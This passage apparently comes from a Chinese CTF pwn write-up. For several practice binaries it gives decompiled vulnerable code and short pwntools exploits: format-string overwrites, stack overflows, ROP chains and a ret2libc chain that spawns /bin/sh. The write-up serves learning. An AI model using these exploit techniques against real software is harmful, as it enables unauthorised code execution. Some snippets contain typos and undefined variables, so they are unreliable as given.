class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, 0x63u);<br>  printf(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  printf(buf);<br>  printf(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, 0xFu);<br>  <span class="hljs-keyword">if</span> ( atoi(nptr) == buf_ )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    puts(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( __readgsdword(0x14u) != v6 )<br>    sub_80493D0();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><br><span class="hljs-comment">## leak_pwd</span><br>payload = <span class="hljs-string">b&#x27;%12$saaa&#x27;</span>+p32(<span class="hljs-number">0x0804C044</span>) <br><span class="hljs-comment">## 等价于payload = b&#x27;%12$saaa&#x27;+p32(elf.sym[&#x27;buf_&#x27;])</span><br>sendline(payload)<br>recvuntil(<span class="hljs-string">&#x27;Hello,&#x27;</span>)<br>pwd = u32(recv(<span class="hljs-number">4</span>))<br><br>sendlineafter(<span class="hljs-string">&#x27;your passwd:&#x27;</span>,<span class="hljs-built_in">str</span>(pwd))<br><br><br><span class="hljs-comment">## modify pwd</span><br>payload = fmtstr_payload(<span class="hljs-number">10</span>,&#123;<span class="hljs-number">0x0804C044</span>:<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">## 等价于payload = b&#x27;%c%12$na&#x27;+p32(0x0804C044)</span><br>sendline(payload)<br>sendlineafter(<span class="hljs-string">&#x27;your passwd:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level2</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>32位栈溢出（无后门）</li>
+<li>函数参数调整</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  vulnerable_function();<br>  system(<span class="hljs-string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br>ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">136</span>]; // [esp+0h] [ebp-88h] BYREF<br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x100u);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]) + p32(<span class="hljs-number">0</span>) + p32(elf.sym[<span class="hljs-string">&#x27;hint&#x27;</span>]) <br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_n_8</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>地址+数据类型</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> v4; // [esp-14h] [ebp-20h]<br>  <span class="hljs-built_in">int</span> v5; // [esp-10h] [ebp-1Ch]<br><br>  var[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>  var[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>  init();<br>  puts(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, var, v4, v5);<br>  <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;var[<span class="hljs-number">13</span>] == 17LL )<br>      system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      printf(<br>        <span class="hljs-string">&quot;something wrong! val is %d&quot;</span>,<br>        var[<span class="hljs-number">0</span>],<br>        var[<span class="hljs-number">1</span>],<br>        var[<span class="hljs-number">2</span>],<br>        var[<span class="hljs-number">3</span>],<br>        var[<span class="hljs-number">4</span>],<br>        var[<span class="hljs-number">5</span>],<br>        var[<span class="hljs-number">6</span>],<br>        var[<span class="hljs-number">7</span>],<br>        var[<span class="hljs-number">8</span>],<br>        var[<span class="hljs-number">9</span>],<br>        var[<span class="hljs-number">10</span>],<br>        var[<span class="hljs-number">11</span>],<br>        var[<span class="hljs-number">12</span>],<br>        var[<span class="hljs-number">13</span>],<br>        var[<span class="hljs-number">14</span>]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printf(<span class="hljs-string">&quot;%s, Welcome!\n&quot;</span>, var);<br>    puts(<span class="hljs-string">&quot;Try do something~&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 将var[13] == \x17即可</span><br>payload = p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a><font style="color:rgb(33, 37, 41);">bjdctf_2020_babystack</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出</li>
+<li>栈平衡</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE buf[<span class="hljs-number">12</span>]; // [rsp+0h] [rbp-10h] BYREF<br>  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF<br><br>  setvbuf(stdout, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  setvbuf(stdin, 0LL, <span class="hljs-number">1</span>, 0LL);<br>  LODWORD(nbytes) = <span class="hljs-number">0</span>;<br>  puts(<span class="hljs-string">&quot;**********************************&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* And Welcome to the bin world!  *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* Please told me u answer loudly!*&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Are u ready?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  puts(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, (unsigned <span class="hljs-built_in">int</span>)nbytes);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 保证能够溢出到返回地址即可</span><br>sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(elf.sym[<span class="hljs-string">&#x27;backdoor&#x27;</span>]+<span class="hljs-number">1</span>)<br>sendline(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_c_1</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出</li>
+<li>编码</li>
+<li>strlen绕过</li>
+<li>Ret2libc</li>
+<li>ROPgadget&#x2F;ROPgadget获取</li>
+<li>函数参数调整</li>
+<li>数据获取</li>
+<li>函数的重复利用</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> encrypt()<br>&#123;<br>  size_t x; // rbx<br>  char s[<span class="hljs-number">48</span>]; // [rsp+0h] [rbp-50h] BYREF<br>  __int16 v3; // [rsp+30h] [rbp-20h]<br><br>  memset(s, <span class="hljs-number">0</span>, sizeof(s));<br>  v3 = <span class="hljs-number">0</span>;<br>  puts(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>);<br>  gets(s);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    x = (unsigned <span class="hljs-built_in">int</span>)x;<br>    <span class="hljs-keyword">if</span> ( x &gt;= strlen(s) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">96</span> || s[x] &gt; <span class="hljs-number">122</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( s[x] &lt;= <span class="hljs-number">64</span> || s[x] &gt; <span class="hljs-number">90</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( s[x] &gt; <span class="hljs-number">47</span> &amp;&amp; s[x] &lt;= <span class="hljs-number">57</span> )<br>          s[x] ^= 0xFu;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        s[x] ^= 0xEu;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      s[x] ^= 0xDu;<br>    &#125;<br>    ++x;<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Ciphertext&quot;</span>);<br>  <span class="hljs-keyword">return</span> puts(s);<br>&#125;<br><br><br><span class="hljs-built_in">int</span> begin()<br>&#123;<br>  puts(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  puts(<span class="hljs-string">&quot;1.Encrypt&quot;</span>);<br>  puts(<span class="hljs-string">&quot;2.Decrypt&quot;</span>);<br>  puts(<span class="hljs-string">&quot;3.Exit&quot;</span>);<br>  <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Input your choice!&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> n2; // [rsp+Ch] [rbp-4h] BYREF<br><br>  init(argc, argv, envp);<br>  puts(<span class="hljs-string">&quot;EEEEEEE                            hh      iii                &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;</span>);<br>  puts(<span class="hljs-string">&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;</span>);<br>  puts(<span class="hljs-string">&quot;====================================================================&quot;</span>);<br>  puts(<span class="hljs-string">&quot;Welcome to this Encryption machine\n&quot;</span>);<br>  begin();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      fflush(0LL);<br>      n2 = <span class="hljs-number">0</span>;<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;n2);<br>      getchar();<br>      <span class="hljs-keyword">if</span> ( n2 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      puts(<span class="hljs-string">&quot;I think you can do it by yourself&quot;</span>);<br>      begin();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( n2 == <span class="hljs-number">3</span> )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( n2 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    encrypt();<br>    begin();<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 这里就将strlen绕过，编码的话只需要将你的payload给他，拿到编码后的payload再重新发送即可</span><br><span class="hljs-comment">## strlen遇到\x00结束，利用这个特性，payload开头以0开始即可</span><br><br>func_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x50</span>+<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br><br>rdiRet = <span class="hljs-number">0x0000000000400c83</span><br>Ret = <span class="hljs-number">0x00000000004006b9</span><br><span class="hljs-comment"># ROPgadget --binary pwn --only &#x27;pop|ret&#x27;</span><br><br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># gdp() 调试，查看是否获取到正确的got值，如果不，那么调整即可</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+overoff * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p(rdiRet) + p(func_got) + p(func_plt) <br><span class="hljs-comment"># puts(puts@got)</span><br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;encrypted\n&quot;</span>,payload)<br>ru(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>SysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>StrAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><span class="hljs-comment"># system(&#x27;/bin/sh/\x00&#x27;)</span><br>sl(payload)<br><br><span class="hljs-comment"># libc6_2.27-0ubuntu3_amd64</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a><font style="color:rgb(33, 37, 41);">jarvisoj_level2_x64</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>64位栈溢出（无后门）</li>
+<li>函数参数调整</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  vulnerable_function(argc, argv, envp);<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>);<br>&#125;<br><br>ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">128</span>]; // [rsp+0h] [rbp-80h] BYREF<br><br>  system(<span class="hljs-string">&quot;echo Input:&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x200uLL);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">rdiRet = <span class="hljs-number">0x00000000004006b3</span><br><br>pyaload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x88</span> + p(rdiRet) + p(elf.sym[<span class="hljs-string">&#x27;hint&#x27;</span>]) + p(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a><font style="color:rgb(33, 37, 41);">get_started_3dsctf_2016</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>缓冲区刷新</li>
+<li>栈溢出+后门</li>
+<li>函数参数调整</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">56</span>]; // [esp+4h] [ebp-38h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="hljs-number">0</span>]);<br>  gets(v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 这道题由于没有刷新缓冲区，那么就导致如果程序无法正常退出则无法显示flag</span><br><span class="hljs-comment">## 所以最后的返回地址我们要跳到exit(0)上-&gt;0x0804E6A0</span><br><span class="hljs-comment">## 还有就是栈溢出的数据大小并不是0x38+4，而是0x38，这个通过调试可以拿到/其他方法也行</span><br>pyaload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p(elf.sym[<span class="hljs-string">&#x27;get_flag&#x27;</span>]) + p(<span class="hljs-number">0x0804E6A0</span>) + p(<span class="hljs-number">0x308CD64F</span>) + p(<span class="hljs-number">0x195719D1</span>)<br></code></pre></td></tr></table></figure>
+
+<h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a><font style="color:rgb(33, 37, 41);">[HarekazeCTF2019]baby_rop</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出（无后门）</li>
+<li>ROPgadget</li>
+<li>函数参数调整</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char v4[<span class="hljs-number">16</span>]; // [rsp+0h] [rbp-10h] BYREF<br><br>  system(<span class="hljs-string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v4);<br>  printf(<span class="hljs-string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">binsh = <span class="hljs-number">0x0601048</span><br>rdiret = <span class="hljs-number">0x000400683</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p(rdiret) + p(binsh) + p(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])<br></code></pre></td></tr></table></figure>
+
+<h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a><font style="color:rgb(33, 37, 41);">others_shellcode</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>系统调用shell</li>
+</ul>
+<p>直接连上就有shell，主要是认识系统怎么实现shell的（侧重汇编）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> getShell()<br>&#123;<br>  <span class="hljs-built_in">int</span> n11; // eax<br>  char _bin__sh[<span class="hljs-number">9</span>]; // [esp-Ch] [ebp-Ch] BYREF<br><br>  strcpy(_bin__sh, <span class="hljs-string">&quot;/bin//sh&quot;</span>);<br>  n11 = <span class="hljs-number">11</span>;<br>  __asm &#123; <span class="hljs-built_in">int</span>     80h; LINUX - sys_execve &#125;<br>  <span class="hljs-keyword">return</span> n11;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a><font style="color:rgb(33, 37, 41);">[OGeek2019]babyrop</font></h1><blockquote>
+<p>考点</p>
+<ul>
+<li>栈溢出</li>
+<li>Ret2libc</li>
+<li>数据接收</li>
+<li>strlen绕过</li>
+</ul>
+<p>这道题有问题</p>
+<ul>
+<li>本地的偏移并不是0xE7（可能是我机子的问题），远程环境的是对的</li>
+<li>libcSearch出的libc无法打通，使用题目提供的libc可以打通</li>
+</ul>
+</blockquote>
